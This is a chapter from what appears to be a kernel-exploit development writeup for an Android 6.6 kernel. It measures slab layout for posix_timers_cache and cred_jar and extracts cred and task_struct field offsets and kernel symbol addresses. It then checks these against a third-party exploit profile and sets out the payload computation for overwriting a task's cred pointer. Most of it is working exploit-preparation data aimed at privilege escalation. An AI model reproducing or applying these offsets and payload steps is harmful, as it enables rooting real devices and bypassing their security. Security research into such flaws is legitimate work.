# 06 · Slab Layout Measurement

[中文](../06-slab-layout.md) · **English**

> To hit a target object precisely you must know the slab geometry. This chapter covers how
> we **measured these numbers on the device**, and how we cross-validated them across
> several independent data sources.

---

## 1. Which numbers are needed

| Parameter | Purpose |
|---|---|
| `sizeof(struct k_itimer)` | identify which allocation is a timer |
| objects per slab | compute the object's position within the page |
| slab size (order) | decide order-0 vs order-1 |
| `node` offset inside the object | compute where the payload lands |
| `sizeof(struct cred)` | find cred allocations |
| `cred_jar` geometry | validate cred addresses |
| `task_struct.cred` offset | rewrite the cred pointer |
| field offsets of `k_itimer` / `cred` / `task_struct` | build the payload |

---

## 2. Source 1: `/proc/slabinfo`

```console
$ adb shell cat /proc/slabinfo | grep -E 'posix_timers|cred_jar|task_struct'
posix_timers_cache   1264   1302    264   31    2    1 : tunables ... : slabdata ...
cred_jar             2100   2142    192   21    1    1 : tunables ... : slabdata ...
task_struct           420    426   4800    6    8    1 : tunables ... : slabdata ...
```

Column meaning:

```
name  active_objs  num_objs  objsize  objperslab  pagesperslab
```

Therefore:

| cache | objsize | objperslab | pagesperslab | Conclusion |
|---|---|---|---|---|
| `posix_timers_cache` | **264** | **31** | **2** | **order-1 (8 KB)** |
| `cred_jar` | **192** | **21** | **1** | order-0 (4 KB) |
| `task_struct` | **4800** | 6 | 8 | order-3 |

### Verify 264 × 31

```
264 x 31 = 8184 <= 8192   OK
264 x 32 = 8448 >  8192   too big
```

**So there are 31 objects per 8 KB slab.**

> Note: Shark's popsicle profile uses `KITIMER_BYTES = 0x100 (256)` and
> `SLAB_OBJECTS = 32`. **Ours is 264 / 31.** That difference matters — never copy it.

---

## 3. Source 2: tracepoint measurements

### 3.1 Find timer allocations

```console
$ adb shell "cat /sys/kernel/tracing/trace | grep kmem_cache_alloc | grep -c ."
$ adb shell "cat /sys/kernel/tracing/trace | grep 'do_timer_create'"
```

Observed:

```
kmem_cache_alloc: call_site=do_timer_create+0xa4/...
                  bytes_req=264 bytes_alloc=264
```

**`bytes_req = 264` directly corroborates slabinfo's `objsize`.**

### 3.2 Find cred allocations

```
kmem_cache_alloc: call_site=prepare_creds+0x24/0x2fc
                  bytes_req=184 bytes_alloc=192
```

**Note that `bytes_req` (184 = `object_size`) differs from `bytes_alloc` (192 = `size`).**

### 3.3 Find task allocations

```
kmem_cache_alloc: call_site=copy_process+0x140/0x1030
                  ptr=... bytes_req=4800 bytes_alloc=4800
```

**4800 = `task_struct` `objsize`, matching slabinfo.**

---

## 4. Source 3: BTF (struct field offsets)

The kernel image carries BTF. Parsing it gives exact field offsets:

| Field | Offset | Notes |
|---|---|---|
| `task_struct.cred` | **0x820** | |
| `task_struct.real_cred` | **0x828** | |
| `cred.uid` / `.gid` | **0x08** | two u32 |
| `cred.suid` / `.sgid` | **0x10** | |
| `cred.euid` / `.egid` | **0x18** | |
| `cred.fsuid` / `.fsgid` | **0x20** | |
| `cred.cap_inheritable` | **0x30** | |
| `cred.cap_permitted` | **0x38** | |
| `cred.cap_effective` | **0x40** | |
| `cred.cap_bset` | **0x48** | |
| `cred.cap_ambient` | **0x50** | |
| `cred.security` | **0x80** | SELinux blob |
| `cred.user` | **0x88** | |
| `cred.user_ns` | **0x90** | |
| `cred.ucounts` | **0x98** | |
| `cred.group_info` | **0xa0** | |
| `sizeof(struct cred)` | **0xb8 (184)** | |

### Cross-validation against Shark's profile

Shark's `K66118_plant.c` contains a profile written specifically for our kernel:

```c
"6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k",
    0xffffffc080195d48ULL,   // timer_site
    0x195d48ULL,             // timer_low21
    0x0ab93cULL,             // copy_low21
    0xffffffc08236a2e0ULL,   // selinux_state
    0xffffffc08211ae0cULL,   // panic_on_warn
    0xffffffc08213f1e0ULL,   // root_user
    0xffffffc08213ef50ULL,   // init_user_ns
    0xffffffc082140cb0ULL,   // init_ucounts
    0xffffffc082140740ULL,   // init_groups
```

**Values we independently extracted from the vmlinux symbol table:**

| Symbol | Shark profile | Our vmlinux | Match |
|---|---|---|---|
| `selinux_state` | `0xffffffc08236a2e0` | `0xffffffc08236a2e0` | ✅ |
| `root_user` | `0xffffffc08213f1e0` | `0xffffffc08213f1e0` | ✅ |
| `init_user_ns` | `0xffffffc08213ef50` | `0xffffffc08213ef50` | ✅ |
| `init_ucounts` | `0xffffffc082140cb0` | `0xffffffc082140cb0` | ✅ |
| `init_groups` | `0xffffffc082140740` | `0xffffffc082140740` | ✅ |
| `do_timer_create+0xa8` | `0x80195d48` | `0x80195d48` | ✅ |
| `copy_process+0x140` | `0xab93c` | `0xab93c` | ✅ |

**All seven match.** This both validates our analysis and proves the profile was written for
our exact kernel.

---

## 5. Source 4: disassembly to confirm the `node` offset

Where does the CPU-timer tree node live inside `k_itimer`?

We disassembled `posix_cpu_timers_exit`:

```asm
; addresses of the three timerqueue_heads
0x...  add  x?, x?, #0x778      ; nextevt
0x...  add  x?, x?, #0x790      ; nextevt (second group)
0x...  add  x?, x?, #0x7a8      ; nextevt (third group)
; tqhead + 8 = rb_leftmost
; inside the loop:
0x...  bl   timerqueue_del
0x...  str  xzr, [node, #0x20]  ; writes node-0x58 -> it_pid
```

Combined with the `struct k_itimer` layout:

```
k_itimer.it          @ 0x78   (union)
  .cpu               @ 0x00
    .node            @ 0x00   -> timerqueue_node -> rb_node @ 0x78
```

**⇒ `KITIMER_NODE = 0x78`.**

**This matches Shark's profile (`node` offset 0x78).**

---

## 6. Putting the numbers together

Now we can do the following:

```
1. Read the k_itimer's real kernel virtual address (victim) from the trace
2. node address = victim + 0x78
3. in-page offset = (victim + 0x78) & 0xfff
4. slab is 8 KB (order-1), start = victim & ~0x1fff
5. which half of the slab does victim occupy:
       ((victim & 0x1fff) >= 4096) ? second half : first half
6. payload to lay out: node+0x00 = 0, node+0x08 = 0, node+0x10 = target
```

**That is the complete derivation of the "exact node offset".**

---

## 7. Why these numbers must be measured

| Item | popsicle value | Our value | Consequence of the difference |
|---|---|---|---|
| `sizeof(k_itimer)` | `0x100` | **`0x108`** | objects per slab 32 → 31, in-page layout changes entirely |
| `SLAB_OBJECTS` | 32 | **31** | |
| `node` offset | 0x78 | 0x78 | same |
| `MEMSTART_PFN` | 0x80000 | **differs (measured)** | different `page_offset` |
| `TARGET_VMEMMAP_START` | `0xfffffffec0000000` | not measured | |

**"Same CVE, different machine, every constant must be re-measured" — that is the basic
discipline of hardware exploitation.**
